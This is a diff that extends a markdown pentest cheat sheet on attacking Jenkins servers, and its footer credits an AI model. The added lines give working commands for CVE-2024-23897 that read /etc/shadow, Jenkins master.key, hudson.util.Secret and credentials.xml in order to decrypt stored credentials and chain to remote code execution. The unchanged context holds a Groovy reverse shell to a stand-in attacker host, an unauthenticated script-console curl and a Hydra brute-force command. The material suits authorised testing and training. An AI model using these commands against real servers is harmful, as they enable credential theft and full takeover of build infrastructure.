@@ -1,7 +1,9 @@
+# Jenkins
+
 #Jenkins #CICD #automation #Groovy #webservices
 
 ## What is Jenkins?
-Open-source CI/CD automation server. Widely used for build pipelines. Key attack surface: Groovy Script Console allows arbitrary OS command execution as the Jenkins service account (often SYSTEM on Windows or jenkins/root on Linux).
+Open-source CI/CD automation server. Widely used for build pipelines. Key attack surface: Groovy Script Console allows arbitrary OS command execution as the Jenkins service account (often SYSTEM on Windows or jenkins/root on Linux); the CLI's arg parser has an unauthenticated arbitrary-file-read (CVE-2024-23897) that chains to RCE.
 
 - Port: **TCP 8080** (default HTTP)
 - Port: **TCP 8443** (HTTPS)
@@ -9,6 +11,20 @@ Open-source CI/CD automation server. Widely used for build pipelines. Key attack
 - Script Console: `/script`
 - Credential store: `/credentials`
 - Config: `$JENKINS_HOME/config.xml`, `$JENKINS_HOME/secrets/`
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/NMAP\|nmap]] | Port/version fingerprint on 8080/8443/50000 |
+| [[Tools/File Transfer/cURL\|cURL]] | Version check, `/scriptText` RCE, API, `j_acegi_security_check` auth |
+| [[Tools/Scanning/gobuster\|gobuster]] | Path discovery (`/script`, `/credentials`, `/api`) |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `jenkins_enum`, `jenkins_script_console`, `jenkins_metaprogramming` |
+| [[Tools/Auth/Hydra\|Hydra]] | Brute force `j_acegi_security_check` login |
+
+> The **Jenkins CLI** (`jenkins-cli.jar`, downloadable from `<target>/jnlpJars/jenkins-cli.jar`) is the vehicle for CVE-2024-23897 and Groovy execution — grab it from the target itself.
 
 ---
 
@@ -148,6 +164,38 @@ pipeline {
 }
 ```
 
+### CVE-2024-23897 — Unauthenticated Arbitrary File Read → RCE
+
+Jenkins ≤ 2.441 / LTS ≤ 2.426.2. The CLI uses args4j, whose `expandAtFiles` feature replaces an argument of the form `@/path/to/file` with that file's **contents**. Any command that echoes its arguments back leaks file contents. **Unauthenticated** users can read the first ~3 lines of a file; users with **Overall/Read** can read the whole file. CISA KEV, mass-exploited Jan 2024.
+
+```bash
+# Grab the CLI jar from the target
+curl -s http://<target>:8080/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar
+
+# Read an arbitrary file — @ triggers the expansion. `help` echoes the "unknown option" arg back.
+java -jar jenkins-cli.jar -s http://<target>:8080/ help "@/etc/passwd"
+java -jar jenkins-cli.jar -s http://<target>:8080/ help "@/etc/shadow"
+
+# Windows
+java -jar jenkins-cli.jar -s http://<target>:8080/ help "@c:\windows\win.ini"
+
+# Full-file read if you have (or find) Overall/Read — connect-node returns more lines
+java -jar jenkins-cli.jar -s http://<target>:8080/ connect-node "@/etc/passwd"
+```
+
+**Chain to RCE:** read the binary secrets that let you decrypt stored credentials, then use them or forge a session:
+
+```bash
+# The three files needed to decrypt $JENKINS_HOME/credentials.xml offline:
+java -jar jenkins-cli.jar -s http://<target>:8080/ connect-node "@/var/lib/jenkins/secrets/master.key"
+java -jar jenkins-cli.jar -s http://<target>:8080/ connect-node "@/var/lib/jenkins/secrets/hudson.util.Secret"
+java -jar jenkins-cli.jar -s http://<target>:8080/ connect-node "@/var/lib/jenkins/credentials.xml"
+# Decrypt offline with a tool like hudson-decrypt / jenkins credential-decryptor,
+# then log in with recovered creds → Script Console → OS RCE (below).
+```
+
+> [!note] Binary reads corrupt on non-UTF8 bytes; the HackTheBox/public PoCs work around this and reconstruct `master.key`/`hudson.util.Secret`. Even partial reads of `credentials.xml`, build logs, or `config.xml` frequently leak API tokens directly.
+
 ### CVE-2018-1000861 — RCE via Stapler Framework
 
 ```bash
@@ -178,6 +226,8 @@ hydra -L users.txt -P passwords.txt http-form-post://<target>:8080/j_acegi_secur
 | Anonymous read access | Info disclosure, may expose builds |
 | Weak admin credentials | Full RCE via script console |
 | Old Jenkins version | Known RCE CVEs |
+| Jenkins ≤ 2.441 / LTS ≤ 2.426.2 | CVE-2024-23897 unauth file read → credential decrypt → RCE |
+| CLI enabled + reachable | args4j `@file` read primitive |
 | Credentials stored in Jenkins | Extraction via script console |
 | Agents with JNLP (50000) exposed | Agent hijacking |
 
@@ -193,4 +243,11 @@ hydra -L users.txt -P passwords.txt http-form-post://<target>:8080/j_acegi_secur
 | RCE (curl, unauth) | `curl -d "script=..." http://host:8080/scriptText` |
 | Reverse shell | `def cmd = ["bash","-c","bash -i >& /dev/tcp/attacker/port 0>&1"]; cmd.execute()` |
 | Extract creds | Groovy credential enumeration via Script Console |
+| CVE-2024-23897 file read | `java -jar jenkins-cli.jar -s http://host:8080/ help "@/etc/passwd"` |
 | MSF | `exploit/multi/http/jenkins_script_console` |
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-25*
+*Model: claude-opus-4-8*
